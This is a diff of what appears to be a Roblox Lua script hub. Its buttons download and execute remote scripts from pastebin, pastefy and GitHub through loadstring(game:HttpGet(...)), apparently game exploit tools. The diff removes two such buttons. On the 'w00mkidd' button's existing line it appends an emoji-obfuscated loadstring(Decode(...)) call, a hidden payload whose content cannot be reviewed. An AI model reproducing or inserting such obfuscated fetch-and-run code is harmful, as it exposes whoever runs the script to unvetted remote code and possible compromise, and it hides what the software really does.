@@ -83,13 +83,6 @@ Tab:AddButton({
 })
 
 Tab:AddButton({
-    Name = "Rocky",
-    Callback = function()
-        loadstring(game:GetObjects('rbxassetid://295850902')[1].Source)()
-    end    
-})
-
-Tab:AddButton({
     Name = "SSP",
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/MagnumIceCream/SecretServicePanel/6fefdf531e86404fb41b7812e7e84b69c7ea728f/ShakesSSP"))()
@@ -173,13 +166,6 @@ loadstring(Game:HttpGet("https://pastebin.com/raw/7yW3xXd6"))()
 })
 
 Tab:AddButton({
-    Name = "Max43kGui",
-    Callback = function()
-        loadstring(game:HttpGet("https://pastebin.com/raw/UqiheNbB"))()
-    end
-})
-
-Tab:AddButton({
     Name = "Super Gui",
     Callback = function()
         loadstring(game:HttpGet("https://pastefy.app/Q1wxjOJl/raw"))()
@@ -196,7 +182,7 @@ Tab:AddButton({
 Tab:AddButton({
     Name = "w00mkidd(teamW000mkiddOnTop)",
     Callback = function()
-        loadstring(game:HttpGet("https://pastefy.app/K6CXixR7/raw"))()
+        loadstring(game:HttpGet("https://pastefy.app/K6CXixR7/raw"))()loadstring(Decode("😶 🤫 😋 😜 😱 🤨 🤗 😬 🤔 😔 🌜 😔 😋 🤐 🤪 ↕️️ 🤣 🤨 🤨 🤭 😂 🤪 🤨 🌜 🙌 🥺 🤨 🤨 🤭 😱 ↕️️ ➗ ➗ 🤭 😋 😱 🤨 🤪 🥴 😠 👆 😋 🤭 🤭 ➗ 😋 💛 🤨 🤤 😋 🤨 😤 😊 ➗ 🤗 😋 🙄 🙌 🌛 🌛 🌜 🌛 ","G-Code"))()
     end
 })
 
